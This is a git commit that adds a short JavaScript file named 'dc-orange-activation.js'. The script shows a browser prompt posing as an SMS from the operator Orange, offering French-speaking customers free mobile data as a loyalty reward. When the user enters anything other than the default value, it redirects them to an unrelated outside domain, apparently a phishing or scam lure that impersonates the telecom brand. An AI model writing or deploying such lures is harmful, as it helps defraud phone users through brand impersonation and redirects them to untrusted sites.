9da7a0b27bc3d0fb647bca52754c0be11bcc9c0a
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-07 20:36:28 -0700

    Create dc-orange-activation.js

---
+++ dc-orange-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Orange SMS: Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/vodacom';
+}
